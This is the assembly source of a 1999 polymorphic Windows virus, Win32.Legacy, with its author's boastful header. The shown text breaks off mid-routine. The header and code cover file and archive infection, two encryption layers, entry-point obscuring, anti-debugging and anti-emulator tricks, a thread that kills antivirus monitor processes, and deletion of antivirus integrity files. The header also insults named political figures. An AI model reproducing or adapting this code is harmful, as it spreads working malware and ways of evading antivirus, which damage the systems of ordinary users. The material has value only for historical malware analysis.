; [Win32.Legacy] - MultiThreaded/Poly/EPO/MMX/RDA/AntiAV/PE/RAR/ARJ,etc.
; Copyright (c) 1999 by Billy Belcebu/iKX
;
; [ Introduction ]
;
; This is a polymorphic heavily armoured  multitask virus. It's  undetectable
; by all the most powerful AVs (August 1999) such as are AVP, NODICE, etc. It
; has two layers of encryption (as my Win32.Thorin), the first one is polymo-
; rphic, made by MMXE v1.01, and the second one  is an antidebug/antiemulator
; one, using also MMX opcodes if available. So, this is the world's first vi-
; rus using MMX opcodes, and i am proud of it! :) Well, the polymorphic engi-
; ne has a sorta plug-in, called PHIRE v1.00 that  is able  to generate a 256
; polymorphic block of code that will be placed  at host entrypoint  for pass
; the control to the polymorphic decryptor  at the last section. So, it's so-
; mething like  an EPO feature. This is  also my  first  virus  that  infects
; archives (RAR & ARJ). This virus also have RDA features, by means of my new
; engine called iENC, that works with  little blocks of code, instead a whole
; virus. There are 13h ;) routines in this virus that are encrypted independe
; ntly from the  two normal layers of  the  virus... It's a  great feature :)
; This babe makes my Thorin to seem a joke... It beats Thorin in almost every
; aspect. The  only bad  point this virus has is, in some  extreme cases, the
; speed. I've tried to fix  that optimizing  a bit  the thread execution, and
; its order. Also, i've made the virus to be executed with the highest priori
; ty of execution. So the delay will be minimal (i hope), and in fastest PCs,
; will be unnoticeable. It's  possible  that  this  virus  has   bugs, but in
; all my tests, it worked perfectly. But nothing is perfect.
;
; Well, that's  too much for  an introduction. Let's see a deeper description
; of all this.
;
; [ Threads ]
;
; The virus' execution is as follows:
;     
; INFECTED FILE           ????????????         
;  ?????????            ??µ Thread 1 ?   ????????????
;  ?       ?>????»      ? ???????????? ??µ Thread 2 ?
;  ? Virus ? ?????????? ? ?????????????? ????????????
;  ?       ? ?        ?>? ?   ????????????     
;  ????????? ?        ?>??? ??µ Thread 3 ?     
;      ?     ?  Main  ?>????? ????????????
;      ?     ? Thread ?>????»       
;      ?     ?        ?>??» ? ????????????
;      ?     ?        ?   ? ??µ Thread 4 ?        
;      ?     ??????????   ?   ???????????? ????????????
;      ?????????<?        ?????????????????µ Thread 5 ?
;                  ????????????            ????????????
;                  ? Thread 6 ?<?????????????????
;                  ????????????
;
; ? -> Thread being executed
;
; So, as you can see, the virus body launches a thread, the main thread, and
; the main thread launches 6 threads, and controls their execution flow: the
; first 4 ones are launched and executed at the same time, while the followin
; 2 must follow an order, one after another. Let's see what does each thread:
;
;       + Thread 1 : This thread is executed the first, and it consists in a
;                    loop that terminates the processes of AVP Monitor and
;                    AMON (monitor of NOD-ICE).
;       + Thread 2 : This thread is the anti-debugging one. Application level
;                    debuggers should die with it.
;       + Thread 3 : This thread deletes from the current directory most of
;                    all the integrity checks of all AV and programs.
;       + Thread 4 : This thread hooks all possible APIs from host import ta-
;                    ble, so it is the PerProcess residence thread.
;       + Thread 5 : This thread prepares the virus for infection, setting up
;                    the directories to infect, etc.
;       + Thread 6 : This thread is used for infect in all the retrieved dir-
;                    ectories all EXE, SCR, CPL, RAR, ARJ files.
;
; Each thread is protected by a SEH handler, so we can handle all the possi-
; ble errors that could happen in their execution. This adds more security to
; the virus, and makes it to become lotsa more robust.
;
; [ Engines ]
;
; This virus features 3 engines: MMXE v1.01, PHIRE v1.00 and iENC v1.00. Lets
; see what will do each one of them:
;
;       + MMXE  : This engine will generate two decryptors, that will be able
;                 to decrypt the first encryption layer of the virus (but the
;                 oly one that is polymorphic). Why two decryptors? Well, the
;                 execution of one or another depends of the existence of the
;                 MMX opcodes (i.e. if  the CPU is MMX). One of them, the one
;                 that will be executed firstly, has MMX opcodes used as gar-
;                 bage, and its  decryption  operation is also a  MMX opcode.
;                 The second decryptor is an 'ussual' polymorphic one.
;       + PHIRE : This is a plug-in for MMXE. It generates a block of 256 by-
;                 tes of polymorphic code that will be placed at the entrypo-
;                 in of the host. The particularity of that code is, besides
;                 the EntryPoint Obscuring (EPO) ability that it gives to the
;                 virus, is that the generated code will generate an excepti-
;                 on handler (SEH), for laterly generate a fault, thus bypas-
;                 sing the control to the handler, that will pass the control
;                 to the MMXE decryptor. This will stop every known emulator.
;       + iENC  : The  Internal ENCryptor  is a RDA  encryptor/decryptor that
;                 brings  you  the  possibility of  encrypt/decrypt blocks of
;                 code inside the virus itself. It's very simple,besides that
;                 is very useful for annoy a bit more the AV people. And that
;                 is my target.
;
; [ Decryption ]
;                                            Glossary.-
; ???????????????<?? Host entrypoint         POLY#1- PHIRE generated code
; ?   POLY#1    ?                            POLY#2- MMXE generated decryptor
; ? ? ? ? ? ? ? ???  Now  jump over all the  ENCR#3- Second encryption layer
; ?             ? ?  host code that was not  
; ?    REST     ? ?  overwritten till reach 
; ?     OF      ? ?  the MMXE layer.
; ?    HOST     ? ?
; ?             ? ?
; ? ? ? ? ? ? ? ?<?
; ?   POLY#2    ?    Now decrypt the next layer
; ? ? ? ? ? ? ? ?
; ?   ENCR#3    ?    Final decryption of virus body
; ? ? ? ? ? ? ? ?
; ? VIRUS CODE! ??>  Some independent blocks of this are also encrypted.
; ???????????????
;
; [ APIs used ]
;
; They are  retrieved knowing  only their CRC32. This, as  you  can see, is a
; great saving of bytes.
;
;       + KERNEL32.DLL          - FindFirstFileA, FindNextFileA, FindClose,
;                                 CreateFileA, DeleteFileA, SetFilePointer,
;                                 SetFileAttributesA, CloseHandle,
;                                 GetCurrentDirectoryA, SetCurrentDirectoryA,
;                                 GetWindowsDirectoryA, GetSystemDirectoryA,
;                                 CreateFileMappingA, MapViewOfFile,
;                                 UnmapViewOfFile,SetEndOfFile,GetProcAddress,
;                                 LoadLibraryA, GetSystemTime, CreateThread,
;                                 WaitForSingleObject,ExitThread,GetTickCount,
;                                 FreeLibrary,WriteFile,GlobalAlloc,GlobalFree,
;                                 GetFileSize, GetFileAttributesA, ReadFile,
;                                 GetCurrentProcess, GetPriorityClass,
;                                 SetPriorityClass
;
;       + USER32.DLL            - FindWindowA, PostMessageA, MessageBoxA
;       + ADVAPI32.DLL          - RegCreateKeyExA, RegSetValueExA
;
; [ APIs hooked ]
;
; All these APIs are part of the '@@Hookz' structure (see data zone of virus)
; and they are got from  the Import  Table only  knowing its CRC32. This is a
; nice feature, we save many bytes with it.
;
;       + With generic hooker   - MoveFileA
;                               - CopyFileA
;                               - GetFullPathNameA
;                               - DeleteFileA
;                               - WinExec
;                               - CreateFileA
;                               - CreateProcessA
;                               - GetFileAttributesA
;                               - SetFileAttributesA
;                               - _lopen
;                               - MoveFileExA
;                               - CopyFileExA
;                               - OpenFile
;
;       + With special hooker   - GetProcAddress
;                               - FindFirstFileA
;                               - FindNextFileA.
;
; [ Features ]
;
; Now here will go the blessed list of what this babe is able to do:
;
;       + Infects EXE, SCR and CPL files.
;       + Drops an infected file to RAR and ARJ archives (dropper is packed)
;       + All targets (EXE/SCR/CPL/RAR/ARJ) are infected if they:
;               - are in \WINDOWS directory
;               - are in \WINDOWS\SYSTEM directory
;               - are in current directory
;               - are accessed by one of the hooked functions
;       + Obtains API addresses knowing only its CRC32 (ET & IT).
;       + EntryPoint Obscuring (EPO), used PHIRE v1.00
;       + Two layers of encryption:
;               - MMXE generated decryptor
;               - Simple non-poly MMX decryptor, also anti-emulators.
;       + Some blocks of code are encrypted (RDA) with iENC v1.00
;       + Anti-Emulation and Anti-Heuristic techniques.
;       + Anti-Monitors, kills the process of AVP Monitor and AMON
;       + Anti-Debugging (SEH, IsDebuggerPresent, FS:[20h], Threads, SoftICE)
;       + MultiThreading (see 'Threads' description above)
;       + Per-Process residence (ImportTable/GetProcAddress)
;       + Fast infector (FindFirstFileA/FindNextFileA)
;       + Kills AV CRC files.
;       + Infects all PE without caring about its ImageBase.
;       + Avoid problems with .reloc section
;       + Able to work under Win95, Win98, WinNT, and Win2k.
;       + Payload: Shows a lame messagebox with a lame message, and after it
;         makes a little changes in the registry ;)
;
; [ Greetings (random order) ]
;
;       + Qozah/29A     -> Finally you did it! Win32.Unreal rulez!
;       + Benny/29A     -> I'll wait for your meta! Btw, bring me a czech beer
;       + Vecna         -> Pray to the real and only god... yourself!
;       + Super/29A     -> Thanx for pointing me bugs and optimizations...
;       + b0z0/iKX      -> I recommend you a padanian band called Lacuna Coil
;       + StarZer0/iKX  -> What did you say to yer mother for go to Amsterdam?
;       + Int13h        -> Espero tu carta ansioso! 
;       + Ypsilon       -> Finish VAS goddamit!!
;       + GriYo/29A     -> El ?nico que llama "cagadas" a sus virus :)
;       + MDriller/29A  -> You help me, i help you... compensation law ;)
;       + Owl[FS]       -> You'll find the perfect girl for your needs...
;       + VirusBust/29A -> Espero que seas feliz con tu nuevo estado civil ;)
;       + MrSandman     -> Lo mismo te digo...
;       + JQwerty       -> Aunque nos pese, pues tambien te digo lo mismo ;)
;       + Wintermute    -> Algun dia entender s a estos mon?gamos X-D
;       + Tcp/29A       -> I'll wait for your HLL PE infector :)
;       + Rajaat        -> The Twisted Nails Of Faith... COF RuleZ!
;       + Somniun       -> Mandame un mail, please
;       + SeptiC        -> You'd have my vote... sure!
;       + TechnoPhunk/TI-> I recommend you to hear Marilyn Manson...
;       + Mandragore    -> Mail me pleeeeease
;       + TheWizard     -> A ver cuando veo algo tuyo pa Win32...
;       + Navi/PHYMOSYS -> Y la #9? :)
;       + Frontis       -> Amo a tu plextor de 8x!
;       + nIgr0         -> Yo me jubilare cuando tu entres en algun grupo :)
;       + SlageHammer   -> Come to Valencia!
;       + T-2000        -> I didn't liked to be infected with yer Kriz ;)
;       + zAxOn         -> Este virus de abajo te va a infectar...
;       + Gigabyte[UC]  -> What about that VBS worm?
;       + Yesna         -> PUTA!
;       + Lord Julus    -> Get a Blind Guardian CD!
;       + Hansi Kursch  -> I hope you'll be able to compose again soon!
;       + J.R.R.Tolkien -> Awesome folklore!
;       + Karl Marx     -> For give me something to believe in.
;
; [ Fucks ]
;
;       + J. M. Aznar   -> I'll dance over your grave, fascist sucker
;       + E. Zaplana    -> Ke haze un tio de murzia presidiendo mi comunidad?
;       + J. Gil y Gil  -> Tiene una estatua de Franco... no comments.
;       + A. Pinochet   -> TO PRISON, MOTHERFUCKER!
;       + F. Franco     -> I'm happy: you're dead
;       + A. Hitler     -> The worst in all the mankind history
;       + S. Milosevic  -> The Hitler of our days
;       + B. Yeltsin    -> Stop drinking vodka!
;       + All the USA   -> You can control others governments, but not me.
;
; [ Final thoughts ]
;
; This virus (and its possible next versions) will be my last "megainfector".
; I will probably add to it ZIP infection, a  compression engine, a code emu-
; lator (that i have almost  finished) and  more  features, but  i think i'll
; guide my steps to smaller viruses. For example, i am writing another Ring-0
; virus, that  will  feature  S&D technology (of course, giving  the deserved
; greet to SSR), and i  am writing some  engines such as a compression one, a
; code emulator, a self-emulated poly engine, and much more. Also, i'm making
; the first steps of the Itxoiten project, building its macros,and developing
; the ITX header. As you can see, i'm really active in coding. I hope i'll be
; able to publish some of that things soon. Of course, i've also almost fini-
; shed my Virus Writing Guide for Win32, that is, at this moment, much bigger
; that its  equivalent for MS-DOS. I hope to finish  it soon too. Well... now
; it's my time to talk about "my things" :) Ok, ok, i'll  tell you about what
; happened me this  last week... Firstly (and painly), my  beloved  Panasonic
; discman (paid with my own money) have  broken up... Secondly, my headphones
; of that discman, have  also broken  up.  I think it happened because i have
; recently  had a  motorbike  crash (finishing  with myself  rolling over the
; fucking  road)  while hearing  music with  the discman... And, today, while
; i was going (again) with the motorbike , a  fucking bee have  bitten  me at
; my face (and now my face seems  a fucking ball because it). Damn, this week
; hasn't been the best  one of my life. I can  only now  day  one thing, that
; only the spanish readers will understand: MEKAG?EN DIOS! Ok, this is enough
; for today...                                            ...Fade to black...
;
;    -To code is as sex: one error, and you'll cry the rest of your life-
;                             (Murphy's law)
;
; (c) 1999 Billy Belcebu/iKX

	.586p
	.model  flat       

extrn   ShellAboutA:PROC                        ; Thanx 4 this c00l api, Vecna
extrn   ExitProcess:PROC

TRUE            equ     01h
FALSE           equ     00h

DEBUG           equ     FALSE

virus_size      equ     (offset virus_end-offset virus_start)
shit_size       equ     (offset delta-offset legacy)
section_flags   equ     00000020h or 20000000h or 80000000h
temp_attributes equ     00000080h
n_Handles       equ     50d
WFD_HndSize     equ     n_Handles*8
n_infections    equ     05h

mark            equ     04Ch                    ; PE Header where put mark
inf_mark        equ     "YCGL"                  ; Mark for infected PE's
archive_mark    equ     "GL"                    ; Mark for infected archives

kernel_w9x      equ     0BFF70000h              ; Win95/98 Kernel
kernel_wNT      equ     077F00000h              ; WinNT kernel
kernel_w2k      equ     077E00000h              ; Win2000 kernel

nDay            equ     31d                     ; Day when activate payload
nMonth          equ     07d                     ; Month when activate payload

Billy_Bel       equ     0BBh                    ; Any problem? :)

THREAD_SLEEPING equ     00000000h
THREAD_ACTIVE   equ     00000001h

; Interesting macros for my code

cmp_            macro   reg,joff1               ; Optimized version of
		inc     reg                     ; CMP reg,0FFFFFFFFh
		jz      joff1                   ; JZ  joff1
		dec     reg                     ; The code is reduced in 3 
		endm                            ; bytes (7-4)

pushs           macro   string2push
		local   __@@__
		call    __@@__
		db      string2push,00h
__@@__:
		endm


eosz_edi        macro
		xor     al,al
		scasb
		jnz     $-1
		endm

apicall         macro   apioff                  ; Optimize muthafucka!
		call    dword ptr [ebp+apioff]
		endm

vsize           macro
		db      virus_size/10000 mod 10 +"0"
		db      virus_size/01000 mod 10 +"0"
		db      virus_size/00100 mod 10 +"0"
		db      virus_size/00010 mod 10 +"0"
		db      virus_size/00001 mod 10 +"0"
		endm

		.data

szMessage       db      "First generation sample",10
		db      "(C) 1999 Billy Belcebu/iKX",0

; Don't care about what the people thinks about you; they are too busy 
; thinking how to know what do you think of them. (Murphy's law)

		.code

; <---
; Below code (until the loop) don't travel with the virus. It putz da correct
; CRC32 of all the  code blocks that are  going to be encrypted independently
; with iENC...
; --->

legacy1:
	lea     esi,iENC_struc                  ; Pointer to iENC structure
	mov     ecx,n_iENC_blocks               ; Number of code blocks
lgcyl00p:
	lodsw                                   ; Get size of block
	cwde                                    ; Clear MSW of EAX
	xchg    edi,eax                         ; EAX = Size
	lodsw                                   ; Get relative ptr to block
	cwde                                    ; Clear MSW of EAX
	add     eax,offset virus_start          ; RVA >> VA
	pushad                                  ; Preserve all registers
	xchg    esi,eax                         ; ESI = Ptr to block
	call    CRC32                           ; Get its CRC32
	mov     [esp.PUSHAD_EBX],eax            ; Preserve after POPAD =)
	popad                                   ; Restore all regs
	sub     eax,08h                         ; Fix pointer
	mov     [eax],ebx                       ; Store block's CRC32
	loop    lgcyl00p                        ; Repeat the same with all

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Virus start                                                            ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;
;????????????????????????;
;                        ;
; I wanna die young      ;  ????????  ???????   ???   ???  ???????   ????????
; and sell my soul       ;  ????????? ????????? ???   ??? ????????? ?????????   
; use up all your drugs  ;  ???   ??? ???   ??? ???   ??? ???       ???
; and make me come       ;  ???   ??? ??? ???   ???   ??? ???  ???? ????????
; Yesterday man,         ;  ???   ??? ???   ??? ???   ??? ???   ???       ???
; i was a nihilist and   ;  ????????? ???   ??? ????????? ????????? ?????????
; now today i'm          ;  ????????  ???   ???  ???????   ???????  ????????
; just too fucking bored ;
;                        ;   -I don't like the drugs but the drugs like me-
;   -Marilyn Manson-     ;  
;????????????????????????;

virus_start     label   byte

legacy:
	db      LIMIT dup (90h)                 ; Space for the poly decryptor

	pushad                                  ; Push all da shit

	mov     ebx,esp                         ; Anti NOD-iCE trick
	push    cs
	pop     eax
	cmp     ebx,esp
	jnz     realep

	call    seh_trick                       ; Kill emulators
	mov     esp,[esp+08h]
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx
	jmp     improvised_delta

decryptor:
	pop     esi                             ; ESI = Ptr to code to decrypt
	mov     ecx,((offset virus_end-offset crypt)/4)
	mov     ebx,12345678h
	org     $-4
key     dd      00000000h       
	mov     edi,esi

	pushad
	xor     eax,eax
	inc     eax
	cpuid                                   ; Check for MMX presence...
	bt      edx,17h                         ; bit 17h, please!
	popad 

	jnc     not_mmx                         ; Damn!

@@__??:
	db      00Fh,06Eh,00Eh                  ; movd  mm1,[esi]
	db      00Fh,06Eh,0D3h                  ; movd  mm2,ebx
	db      00Fh,0EFh,0CAh                  ; pxor  mm1,mm2
	db      00Fh,07Eh,00Eh                  ; movd  [esi],mm1

	add     esi,4                           ; Get next dword
	loop    @@__??                          ; And decrypt it

	jmp     realep                          ; Jump to unencrypted code

not_mmx:
	lodsd                                   ; Load dword to decrypt
	xor     eax,ebx                         ; Decrypt it
	stosd                                   ; Store the decrypted dword
	loop    not_mmx                         ; And loop until all decrypted

	jmp     realep                          ; Jump to unencrypted code

seh_trick:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp
	dec     byte ptr [edx]                  ; Bye bye emulators
	jmp     realep                          ; DiE NOD!!! Muahahahah!

improvised_delta:
	call    decryptor

; Let me see you stripped...

crypt   label   byte

	db      00h,"Welcome to the realm of the legacy of kings...",00h

realep: call    delta                           ; Hardest code to undestand ;)
delta:  pop     ebp
	mov     eax,ebp
	sub     ebp,offset delta                ; EBP = Delta offset

	sub     eax,shit_size                   ; Obtain at runtime the 
	sub     eax,00001000h                   ; imagebase of the process
NewEIP  equ     $-4
	mov     dword ptr [ebp+ModBase],eax     ; EAX = Process' imagebase

	pushad

	call    ChangeSEH                       ; SEH rlz :)
	mov     esp,[esp+08h]                   ; Fix stack
	jmp     RestoreSEH                      ; And restore old SEH handler
ChangeSEH:
	xor     ebx,ebx                         ; EBX = 0
	push    dword ptr fs:[ebx]              ; Save old SEH handler
	mov     fs:[ebx],esp                    ; Set new SEH handler
       
	call    iENC_decrypt
	dd      00000000h
	dd      eBlock1-Block1

Block1  label   byte
	mov     esi,[esp+48h]                   ; Get program return address
	mov     ecx,05h                         ; Limit
	call    GetK32
	or      eax,eax                         ; EAX = 0? If so, error...
	jz      RestoreSEH                      ; Then we go away...

	mov     dword ptr [ebp+kernel],eax      ; EAX must be K32 base address

	lea     esi,[ebp+@@NamezCRC32]          ; ESI = Pointer to CRC32 array
	lea     edi,[ebp+@@Offsetz]             ; EDI = Where put addresses
	call    GetAPIs                         ; Retrieve all APIs

	lea     edi,[ebp+random_seed]           ; Initialize slow random seed
	push    edi
	apicall _GetSystemTime

	apicall _GetCurrentProcess              ; This virus is slow, so i'm
						; looking in this routines
	push    eax                             ; for the wanted speed
	mov     dword ptr [ebp+CurrentProcessHandle],eax

	push    eax                             ; Get the original priority
	apicall _GetPriorityClass               ; class
	mov     dword ptr [ebp+OriginalPriorityClass],eax
	pop     ecx

	xchg    eax,ecx                         ; Fail? Duh!
	jecxz   ErrorCreatingMainThread

	push    80h                             ; Set the priority needed for
	push    eax                             ; a faster execution
	apicall _SetPriorityClass

	xor     edx,edx
	lea     eax,[ebp+lpThreadId]
	push    eax                             ; lpThreadId
	push    edx                             ; dwCreationFlags
	push    ebp                             ; lpParameter
	lea     eax,[ebp+MainThread]            
	push    eax                             ; lpStartAddress
	push    edx                             ; dwStackSize
	push    edx                             ; lpThreadAttributes
	apicall _CreateThread
	xchg    eax, ecx                        ; Error?
	jecxz   ErrorCreatingMainThread         ; Damn...
	
	xor     eax,eax                         ; Wait infinite seconds until
	dec     eax                             ; main thread is finished
	push    eax                             ; Push -1
	push    ecx                             ; Push main thread handle
	apicall _WaitForSingleObject

eBlock1 label   byte

	push    12345678h                       ; Put again the original 
OriginalPriorityClass   equ $-4                 ; priority of the process for
	push    12345678h                       ; avoid suspitions
CurrentProcessHandle    equ $-4
	apicall _SetPriorityClass

	push    WFD_HndSize                     ; Hook some mem for WFD_Handles
	push    00000000h                       ; structure
	apicall _GlobalAlloc
	mov     dword ptr [ebp+WFD_HndInMem],eax

	call    payload                         ; Hohohohoho!

ErrorCreatingMainThread:
	or      ebp,ebp                         ; Is 1st gen?
	jz      fakehost                        ; If so, jump to the fake host

RestoreSEH:
	xor     ebx,ebx                         ; EBX = 0
	pop     dword ptr fs:[ebx]              ; Restore old SEH handler
	pop     eax                             ; Remove shit from stack

	popad                                   ; Restore old registers

	call    RestoreOldBytes                 ; Restore host's 1st bytes

	popad                                   ; Restore all!

	mov     ebx,12345678h                   ; C'mon! 
	org     $-4
OldEIP  dd      00001000h

	add     ebx,12345678h                   ; It's on!
	org     $-4
ModBase dd      00400000h

	push    ebx                             ; Pass control to the host
	ret                                     ; code...

; Justice is lost, justice is raped, justice is gone...

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Restore the first 256 bytes of the host                                ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

RestoreOldBytes:
	mov     edi,dword ptr [ebp+OldEIP]
	add     edi,dword ptr [ebp+ModBase]     ; EDI = Ptr to host's EP
	lea     esi,dword ptr [ebp+OldBytes]    ; ESI = Ptr to its orig. bytes
	mov     ecx,pLIMIT                      ; ECX = Bytes to restore
	rep     movsb                           ; Restore it!
	ret

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| The main thread of the virus                                           ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;
; Higher you are, harder you fall
;

MainThread      proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread                ; EBP = Delta offset

	pushad

	call    MT_SetupSEH                     ; SetUp a new SEH handler
	mov     esp,[esp+08h]
	jmp     MT_RestoreSEH
MT_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp
       
	call    iENC_decrypt
	dd      00000000h
	dd      eBlock2-Block2

Block2  label   byte
	call    GetUsefulInfo                   ; Retrieve useful info

	mov     ecx,nThreads                    ; ECX = Number of threads to
						;       launch
	lea     esi,[ebp+ThreadsTable]          ; ESI = Ptr to thread table

LoopOfLaunchAllThreads:
	push    ecx                             ; Preserve ECX
	xor     edx,edx                         ; EDX = 0
	lea     eax,[ebp+lpThreadId]
	push    eax                             ; lpThreadId
	push    edx                             ; dwCreationFlags
	push    ebp                             ; lpParameter

	lodsd
	add     eax,ebp
	push    eax                             ; lpStartAddress

	push    edx                             ; dwStackSize
	push    edx                             ; lpThreadAttributes
	apicall _CreateThread
	pop     ecx
	loop    LoopOfLaunchAllThreads

; Control loops of all threads
       
	inc     byte ptr [ebp+TKM_semaphore]    ; Init Thread 1
	inc     byte ptr [ebp+TAD_semaphore]    ; Init Thread 2
	inc     byte ptr [ebp+TDC_semaphore]    ; Init Thread 3
	inc     byte ptr [ebp+TPP_semaphore]    ; Init Thread 4
	inc     byte ptr [ebp+TPI_semaphore]    ; Init Thread 5 

TAD_CL: cmp     byte ptr [ebp+TAD_semaphore],THREAD_SLEEPING
	jnz     TAD_CL                          ; Wait for Thread 2 end

	cmp     byte ptr [ebp+SoftICE],00h
	jne     TKM_CL

TPI_CL: cmp     byte ptr [ebp+TPI_semaphore],THREAD_SLEEPING
	jnz     TPI_CL

	inc     byte ptr [ebp+TIF_semaphore]    ; Init Thread 6 after Thread 5
TIF_CL: cmp     byte ptr [ebp+TIF_semaphore],THREAD_SLEEPING ; ends
	jnz     TIF_CL

TKM_CL: cmp     byte ptr [ebp+TKM_semaphore],THREAD_SLEEPING
	jnz     TKM_CL                          ; Wait for Thread 1 end

TDC_CL: cmp     byte ptr [ebp+TDC_semaphore],THREAD_SLEEPING
	jnz     TDC_CL                          ; Wait for Thread 3 end

TPP_CL: cmp     byte ptr [ebp+TPP_semaphore],THREAD_SLEEPING
	jnz     TPP_CL                          ; Wait for Thread 4 end

eBlock2 label   byte

MT_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	jmp     ExitThread
MainThread      endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| This procedure makes the thread that call it to be closed              ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ExitThread:
	push    00h
	apicall _ExitThread
	ret

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Thread used for kill TSR monitors (AVP & NOD)                          ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ThrKillMonitors proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread

	xor     ecx,ecx
TKM_Sleep:
	mov     cl,THREAD_SLEEPING
TKM_semaphore   equ $-1
	jecxz   TKM_Sleep

	pushad

	call    TKM_SetupSEH                    ; SetUp a SEH handler
	mov     esp,[esp+08h]
	jmp     TKM_RestoreSEH
TKM_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	call    iENC_decrypt                    ; Encrypt this block
	dd      00000000h
	dd      eBlock3-Block3

Block3  label   byte

	lea     edi,[ebp+Monitors2Kill]         ; EDI = Ptr to array of mons.
KM_L00p:
	call    TerminateProc                   ; Terminate its process
	eosz_edi                                ; End Of String of EDI
	cmp     byte ptr [edi],Billy_Bel        ; End of array? 
	jnz     KM_L00p                         ; Kewl.

eBlock3 label   byte

TKM_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	and     byte ptr [ebp+TKM_semaphore],THREAD_SLEEPING

	jmp     ExitThread
ThrKillMonitors endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Thread for kill the application level debuggers                        ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ThrAntiDebugger proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread

	xor     ecx,ecx
TAD_Sleep:
	mov     cl,THREAD_SLEEPING
TAD_semaphore   equ $-1
	jecxz   TAD_Sleep

	pushad

	call    TAD_SetupSEH
	mov     esp,[esp+08h]
	jmp     TAD_RestoreSEH
TAD_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock4-Block4

Block4  label   byte

	and     byte ptr [ebp+SoftICE],00h

; I'm a SoftICE addict... any problem? :)

	IF      DEBUG
	ELSE
DetectSICE:
	lea     edi,[ebp+Drivers2Avoid]
SearchDriverz:
	xor     eax,eax                         ; This little trick allows
	push    eax                             ; us to check for drivers,
	push    00000080h                       ; so we can check for our
	push    00000003h                       ; beloved SoftICE in its 
	push    eax                             ; Win9x and WinNT versions!
	inc     eax
	push    eax
	push    80000000h or 40000000h
	push    edi
	apicall _CreateFileA

	inc     eax
	jz      NoDriverFound
	dec     eax

	push    eax
	apicall _CloseHandle

	inc     byte ptr [ebp+SoftICE]

NoDriverFound:
	eosz_edi
	cmp     byte ptr [edi],Billy_Bel
	jnz     SearchDriverz

	ENDIF

some_antidebug:
	mov     ecx,fs:[20h]                    ; ECX = Context of debugger
	jecxz   more_antidebug                  ; If ECX<>0, we're debugged
	jmp     hangit

more_antidebug:
	pushs   "IsDebuggerPresent"
	push    dword ptr [ebp+kernel]
	apicall _GetProcAddress
	xchg    eax,ecx                         ; Same than above, but API
	jecxz   TAD_Exit                        ; based
	
	call    ecx
	xchg    eax,ecx
	jecxz   TAD_Exit

hangit: xor     esp,esp                         ; Hahahahah! DiE-DiE-DiE!!!
	cli
	call    $-1

eBlock4 label   byte

TAD_Exit:
TAD_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	and     byte ptr [ebp+TAD_semaphore],THREAD_SLEEPING
	jmp     ExitThread
ThrAntiDebugger endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Thread used for delete AV CRC files                                    ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ThrDeleteCRC    proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread

	xor     ecx,ecx
TDC_Sleep:
	mov     cl,THREAD_SLEEPING
TDC_semaphore   equ $-1
	jecxz   TDC_Sleep

	pushad

	call    TDC_SetupSEH
	mov     esp,[esp+08h]
	jmp     TDC_RestoreSEH
TDC_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock5-Block5

Block5  label   byte

	lea     edi,[ebp+Files2Kill]            ; Load pointer to first file

killem: push    edi                             ; Push file to erase
	apicall _DeleteFileA                    ; Delete it!
	eosz_edi
	cmp     byte ptr [edi],Billy_Bel
	jnz     killem       

eBlock5 label   byte

TDC_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	and     byte ptr [ebp+TDC_semaphore],THREAD_SLEEPING

	jmp     ExitThread
ThrDeleteCRC    endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Thread used for retrieve all the useful info for infection             ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ThrPrepareInf   proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread

	xor     ecx,ecx
TPI_Sleep:
	mov     cl,THREAD_SLEEPING
TPI_semaphore   equ $-1
	jecxz   TPI_Sleep

	pushad

	call    TPI_SetupSEH
	mov     esp,[esp+08h]
	jmp     TPI_RestoreSEH
TPI_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock6-Block6

Block6  label   byte

	lea     edi,[ebp+WindowsDir]            ; Get windows directory
	push    7Fh
	push    edi
	apicall _GetWindowsDirectoryA

	add     edi,7Fh                         ; Get system directory
	push    7Fh
	push    edi
	apicall _GetSystemDirectoryA

	add     edi,7Fh                         ; Get current directory
	push    edi
	push    7Fh
